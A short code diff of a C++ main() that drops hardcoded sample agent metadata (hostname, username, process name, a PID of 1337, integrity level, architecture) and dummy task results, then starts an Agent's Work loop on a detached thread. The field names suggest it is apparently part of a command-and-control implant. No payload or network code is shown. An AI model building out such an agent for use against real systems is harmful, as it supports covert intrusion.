@@ -8,23 +8,9 @@
 int main()
 {
 	
-	AgentMetadata metadata = {
-		1,
-		"hostname",
-		"username",
-		"processname",
-		1337,
-		"integrity",
-		"arch"
-	};
 	
-	Agent agent = Agent(metadata);
-
-	TaskResult result = { 1, "Task completed successfully" };
-	TaskResult result2 = { 2, "Another task completed" };
-
-	agent.addResult(result);
-	agent.addResult(result2);
+	
+	Agent agent = Agent();
 
 	std::thread thread(&Agent::Work, &agent);
 	thread.detach();
